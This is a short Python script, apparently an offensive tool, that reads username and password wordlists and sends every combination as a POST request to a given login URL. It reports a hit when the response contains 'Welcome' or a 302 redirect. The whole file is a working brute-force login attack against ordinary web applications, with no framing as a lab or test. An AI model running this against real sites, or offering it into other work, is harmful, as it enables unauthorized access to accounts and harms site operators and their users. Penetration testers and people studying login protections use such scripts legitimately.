import requests

def run(url, userlist_path, passlist_path):
    with open(userlist_path) as ufile:
        users = ufile.read().splitlines()
    with open(passlist_path) as pfile:
        passwords = pfile.read().splitlines()

    for user in users:
        for password in passwords:
            print(f"[*] Trying {user}:{password}")
            r = requests.post(url, data={"username": user, "password": password})
            if "Welcome" in r.text or r.status_code == 302:
                print(f"[+] Possible valid credentials: {user}:{password}")
                return
    print("[-] No valid credentials found.")
